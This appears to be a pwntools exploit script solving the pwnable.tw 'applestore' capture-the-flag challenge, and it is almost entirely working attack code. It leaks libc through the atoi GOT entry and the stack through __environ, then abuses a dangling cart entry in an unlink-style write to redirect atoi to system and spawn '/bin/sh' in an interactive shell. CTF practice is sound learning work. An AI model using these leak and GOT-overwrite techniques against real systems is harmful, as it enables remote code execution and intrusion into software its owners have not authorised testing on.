#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("applestore_patched", checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
ld = ELF("ld-2.23.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *cart+72
# b *0x080489f5
b *0x080489eb
b *0x08048a6f
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10104
        return remote(host, port)

p = conn()

def add_device(index):
    slan(p, b'>', 2)
    slan(p, b'Number> ', index)

def delete_device(index):
    slan(p, b'>', 3)
    sa(p, b'Number> ', index)

def checkout(pl):
    slan(p, b'>', 5)
    sa(p, b'(y/n) >', pl)

def cart(pl):
    slan(p, b'>', 4)
    sa(p, b'(y/n) >', pl)

# Get total price to 7174
for i in range(6):
    add_device(1)

for i in range(20):
    add_device(2)

checkout(b'y')

cart(flat(b'yy', exe.got['atoi'], 0, 0, 0))

ru(p, b'27: ')
libc.address = leak_bytes(rn(p, 4), libc.symbols['atoi'])
lg("libc address", libc.address)

cart(flat(b'yy', libc.symbols['__environ'], 0, 0, 0))

ru(p, b'27: ')
stack = leak_bytes(rn(p, 4))
lg("stack", stack)

ebp_addr = stack - 0x10c
saved_ebp = exe.got['atoi'] + 0x22
lg("ebp address", ebp_addr)
lg("saved ebp", saved_ebp)
delete_device(flat(b'27', 0, 0, saved_ebp, ebp_addr))

sa(p, b'>', p32(libc.symbols['system']) + b';/bin/sh\0')

rr(p, 1)
ia(p)